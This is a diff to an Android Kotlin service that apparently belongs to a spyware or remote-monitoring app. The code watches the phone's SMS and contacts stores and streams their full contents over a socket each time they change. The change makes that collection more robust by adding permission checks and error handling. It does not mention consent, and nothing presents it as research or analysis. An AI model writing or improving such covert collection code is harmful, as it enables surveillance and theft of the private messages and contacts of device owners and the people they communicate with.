@@ -918,12 +918,20 @@ class MainService : Service() {
     private fun startBatteryMonitoring() { registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED)) }
     
     private fun registerContentObservers() {
-        contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, object : android.database.ContentObserver(Handler(Looper.getMainLooper())) {
-            override fun onChange(selfChange: Boolean) { getSmsMessages()?.let { socket.emit("device:data:bulk", JSONObject().apply { put("sms", it) }) } }
-        })
-        contentResolver.registerContentObserver(ContactsContract.Contacts.CONTENT_URI, true, object : android.database.ContentObserver(Handler(Looper.getMainLooper())) {
-            override fun onChange(selfChange: Boolean) { getContacts()?.let { socket.emit("device:data:bulk", JSONObject().apply { put("contacts", it) }) } }
-        })
+        try {
+            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
+                contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI, true, object : android.database.ContentObserver(Handler(Looper.getMainLooper())) {
+                    override fun onChange(selfChange: Boolean) { getSmsMessages()?.let { socket.emit("device:data:bulk", JSONObject().apply { put("sms", it) }) } }
+                })
+            }
+        } catch (e: Exception) { Log.e(TAG, "SMS observer error: ${e.message}") }
+        try {
+            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
+                contentResolver.registerContentObserver(ContactsContract.Contacts.CONTENT_URI, true, object : android.database.ContentObserver(Handler(Looper.getMainLooper())) {
+                    override fun onChange(selfChange: Boolean) { getContacts()?.let { socket.emit("device:data:bulk", JSONObject().apply { put("contacts", it) }) } }
+                })
+            }
+        } catch (e: Exception) { Log.e(TAG, "Contacts observer error: ${e.message}") }
     }
     
     private fun getBatteryLevel(): Int {
